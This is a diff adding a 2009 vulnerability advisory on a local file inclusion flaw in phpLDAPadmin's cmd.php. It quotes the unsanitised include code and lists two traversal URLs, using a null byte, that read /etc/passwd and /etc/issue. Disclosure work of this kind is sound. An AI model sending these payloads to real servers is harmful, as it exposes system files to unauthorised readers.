@@ -1,0 +1,53 @@
+########################################################################
+#		PHPLDAPADMIN LOCAL FILE INCLUSION
+########################################################################
+
+author	: ipsecs
+website	: http://ipsecs.com
+Date		: December, 10th, 2009
+
+
+-[i]- Description
+
+"Phpldapadmin is web based LDAP client which provides easy,
+anywhere-accessible, multi-language administration for LDAP
+server."
+http://phpldapadmin.sourceforge.net
+
+vulnerable version:
+phpldapadmin 1.1.0.5
+Ubuntu 8.10
+Debian 5.0
+Other version may be affected
+
+-[ii]- Vulnerable Code
+
+Vulnerable code is found in cmd.php which doesn't sanitize
+URI parameter provided by user input.
+
+line 10
+$www['cmd'] = get_request('cmd','REQUEST');
+
+line 22-27
+if (defined('HOOKSDIR') && file_exists(HOOKSDIR.$www['cmd'].'.php'))
+       $file = HOOKSDIR.$www['cmd'].'.php';
+
+elseif (defined('HTDOCDIR') && file_exists(HTDOCDIR.$www['cmd'].'.php'))
+       $file = HTDOCDIR.$www['cmd'].'.php';
+
+line 38-39
+if ($file)
+       include $file;
+
+Attacker may view any arbitrary files trough 'cmd' parameter 
+in URI request.
+
+-[iii]- Exploit
+
+http://server/phpldapadmin/cmd.php?cmd=../../../../etc/passwd%00
+http://server/phpldapadmin/cmd.php?cmd=../../../../issue%00
+
+-[iv]- Fix
+
+Sanitize $file before being included. Unfortunaltely there is 
+no working patch at this time.
